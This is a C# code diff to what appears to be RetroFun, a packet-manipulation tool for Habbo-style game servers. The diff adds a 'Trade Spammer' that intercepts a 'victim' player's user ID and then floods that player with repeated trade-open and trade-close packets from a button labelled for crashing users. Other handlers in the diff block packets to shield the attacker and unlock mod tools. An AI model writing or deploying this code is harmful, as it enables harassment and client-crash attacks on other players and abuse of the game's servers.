@@ -11,6 +11,7 @@ using RetroFun.Controls;
 using Sulakore.Protocol;
 using Sulakore.Communication;
 using Sulakore.Components;
+using System.Threading;
 
 namespace RetroFun.Pages
 {
@@ -22,6 +23,10 @@ namespace RetroFun.Pages
 
         private bool HasUserPermissionsMessage;
         private bool _HasModToolsUnlocked;
+        private bool IsInterceptTradeUserOn;
+        private bool TradeSpammerActivated;
+
+
 
 
         public bool HasModToolsUnlocked
@@ -96,6 +101,35 @@ namespace RetroFun.Pages
             }
         }
 
+
+
+
+
+
+        private int _TradeSpammerUserID;
+        public int TradeSpammerUserID
+        {
+            get => _TradeSpammerUserID;
+            set
+            {
+                _TradeSpammerUserID = value;
+                RaiseOnPropertyChanged();
+            }
+        }
+
+        private int _TradeSpammerCooldown;
+        public int TradeSpammerCooldown
+        {
+            get => _TradeSpammerCooldown;
+            set
+            {
+                _TradeSpammerCooldown = value;
+                RaiseOnPropertyChanged();
+            }
+        }
+
+
+
         public int CreditsValue
         {
             get => _CreditsValue;
@@ -130,10 +164,15 @@ namespace RetroFun.Pages
             Bind(CreditsNbx, "Value", nameof(CreditsValue));
             Bind(CrystalsNbx, "Value", nameof(CrystalsValue));
             Bind(DucketsNbx, "Value", nameof(DucketsValue));
+            Bind(UserIntUpDwn, "Value", nameof(TradeSpammerUserID));
+            Bind(TradeSpammerCooldownNbx, "Value", nameof(TradeSpammerCooldown));
 
             if (Program.Master != null)
             {
-                Triggers.OutAttach(In.UserPermissions, CloneDefaultUserPermissions);
+                Triggers.InAttach(In.UserPermissions, CloneDefaultUserPermissions);
+                Triggers.InAttach(In.TradeStopped, PreventCrashOnTrade);
+
+                Triggers.OutAttach(Out.TradeStart, InterceptTradeUser);
             }
 
 
@@ -147,6 +186,29 @@ namespace RetroFun.Pages
                 HasUserPermissionsMessage = true;
             }
         }
+
+        private void InterceptTradeUser(DataInterceptedEventArgs e)
+        {
+            if (IsInterceptTradeUserOn)
+            {
+                TradeSpammerUserID = e.Packet.ReadInteger();
+                TradeSpammerspeak("Victim ID Found!");
+                IsInterceptTradeUserOn = false;
+                e.IsBlocked = true;
+            }
+
+        }
+
+
+        private void PreventCrashOnTrade(DataInterceptedEventArgs e)
+        {
+            if (TradeSpammerActivated)
+            {
+                e.IsBlocked = true;
+            }
+
+        }
+
 
         private void EnableModToolsBtn_Click(object sender, EventArgs e)
         {
@@ -300,5 +362,61 @@ namespace RetroFun.Pages
         {
             Connection.SendToClientAsync(In.UserCredits, CreditsValue + ".0");
         }
+
+
+
+        private void StartTradeSpammer()
+        {
+            new Thread(() =>
+            {
+                Thread.CurrentThread.IsBackground = true;
+                do
+                {
+                    if (TradeSpammerActivated)
+                    {
+                        Connection.SendToServerAsync(Out.TradeStart, TradeSpammerUserID);
+                        Thread.Sleep(TradeSpammerCooldown);
+                        Connection.SendToServerAsync(Out.TradeClose);
+                        Thread.Sleep(TradeSpammerCooldown);
+                    }
+                } while (TradeSpammerActivated);
+            }).Start();
+        }
+
+
+
+
+
+
+        private void CrashUserBtn_Click(object sender, EventArgs e)
+        {
+            if(TradeSpammerActivated)
+            {
+                WriteToButton(CrashUserBtn, "Spam Trade : OFF"); 
+                TradeSpammerActivated = false;
+            }
+            else
+            {
+                WriteToButton(CrashUserBtn, "Spam Trade : ON");
+                TradeSpammerActivated = true;
+                StartTradeSpammer();
+            }
+        }
+
+        private void CaptureTradeUserBtn_Click(object sender, EventArgs e)
+        {
+            TradeSpammerspeak("Please trade once with the victim to intercept his Trade user ID.");
+            IsInterceptTradeUserOn = true;
+        }
+
+        private void TradeSpammerspeak(string text)
+        {
+            if (Connection.Remote.IsConnected)
+            {
+                Connection.SendToClientAsync(In.RoomUserWhisper, 0, "[Trade Spammer]: " + text, 0, 34, 0, -1);
+            }
+        }
+
+
     }
 }
